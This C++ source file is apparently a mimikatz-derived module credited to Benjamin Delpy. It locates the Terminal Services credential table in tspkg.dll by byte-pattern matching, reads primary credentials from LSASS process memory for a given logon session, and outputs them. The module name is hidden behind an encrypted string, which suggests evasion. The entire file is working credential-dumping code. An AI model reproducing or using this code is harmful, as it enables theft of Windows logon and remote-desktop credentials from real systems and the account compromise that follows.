/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include <Windows.h>
#include <Psapi.h>

#include "tspkg.h"

#include "..\lpmemory.h"
#include "..\..\inc\dbg.h"
#include "..\..\inc\mem.h"	
#include "..\..\inc\CryptoStrings.h"	

PRTL_AVL_TABLE TSGlobalCredTable;

VOID ts_InitGlobals()
{
	TSGlobalCredTable = NULL;
}


bool searchTSPKGFuncs(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszTspkg;

#ifdef _M_X64
	BYTE PTRN_WALL_TSGlobalCredTable[]	= {0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_TSGlobalCredTable	= sizeof(PTRN_WALL_TSGlobalCredTable);
#elif defined _M_IX86
	BYTE PTRN_WNO8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe};
	LONG OFFS_WNO8_TSGlobalCredTable	= sizeof(PTRN_WNO8_TSGlobalCredTable);

	BYTE PTRN_WIN8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x53, 0xbb};
	LONG OFFS_WIN8_TSGlobalCredTable	= sizeof(PTRN_WIN8_TSGlobalCredTable);
#endif

	if(pContext->pModTSPKG && !TSGlobalCredTable)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&TSGlobalCredTable);
#ifdef _M_X64
		pattern	= PTRN_WALL_TSGlobalCredTable;
		taille	= sizeof(PTRN_WALL_TSGlobalCredTable);
		offset	= OFFS_WALL_TSGlobalCredTable;
#elif defined _M_IX86
		if (pContext->GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WNO8_TSGlobalCredTable);
			offset	= OFFS_WNO8_TSGlobalCredTable;
		}
		else
		{
			pattern	= PTRN_WIN8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WIN8_TSGlobalCredTable);
			offset	= OFFS_WIN8_TSGlobalCredTable;
		}
#endif

		wszTspkg = CRSTRW("tspkg", "\xff\xdf\xcb\x0b\xfa\xdf\xdf\x10\xff\xcc\x2c");

		if (HMODULE monModule = LoadLibrary(wszTspkg))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				lp_genericPatternSearch(pointeur, wszTspkg, pattern, taille, offset);
				*pointeur += pContext->pModTSPKG->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

		my_free(wszTspkg);

	}
	return (pContext->pModTSPKG && TSGlobalCredTable);
}

bool WINAPI getTsPkgLogonData(LP_MODULE_CONTEXT *pContext, __in PLUID logId)
{
	//DbgPrint("entered");

	if(searchTSPKGFuncs(pContext))
	{
		//DbgPrint("funcs got");

		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		BYTE * monBuffP = new BYTE[sizeof(KIWI_TS_CREDENTIAL)], * monBuffC = new BYTE[sizeof(KIWI_TS_PRIMARY_CREDENTIAL)];
		if(PKIWI_TS_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(lpgetPtrFromAVLByLuid(pContext, TSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), logId)))
		{
			//DbgPrint("in1");

			if (lp_readMemory(pLogSession, monBuffP, sizeof(KIWI_TS_CREDENTIAL), pContext->hLSASS))
			{
				//DbgPrint("in2");
				pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL>(monBuffP);
				if(pLogSession->pTsPrimary)
				{
					//DbgPrint("in3");
					if (lp_readMemory(pLogSession->pTsPrimary, monBuffC, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), pContext->hLSASS))
						mesCreds = &(reinterpret_cast<PKIWI_TS_PRIMARY_CREDENTIAL>(monBuffC)->credentials);

				} //else wcout << L"n.s. (SuppCred KO) / ";
			}
		}
		//DbgPrint("fin");
		#ifdef _DEBUG
			pContext->wszPackageName = L"tspkg";
		#endif
		lpgenericCredsToStream(pContext, mesCreds, TRUE);
		delete [] monBuffC, monBuffP;

	} //else { DbgPrint("WARN: tspkg init failed"); }
	return true;
}
